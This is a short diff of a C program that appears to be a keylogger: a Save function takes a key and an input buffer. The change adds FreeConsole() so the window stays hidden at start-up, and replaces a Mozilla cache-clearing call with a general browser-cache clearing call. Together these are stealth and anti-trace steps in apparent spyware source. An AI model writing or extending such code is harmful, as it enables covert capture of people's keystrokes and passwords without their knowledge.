@@ -132,7 +132,8 @@ void Save(int key, char* input)
 
 int main()
 {
-    ClearMozillaCache();
+    ClearBrowserCache();
+    FreeConsole();      //frees console window from poping on start-up
     int counter = 0;
     char* input = (char*)malloc(100*sizeof(char));
     input[0]='\0';
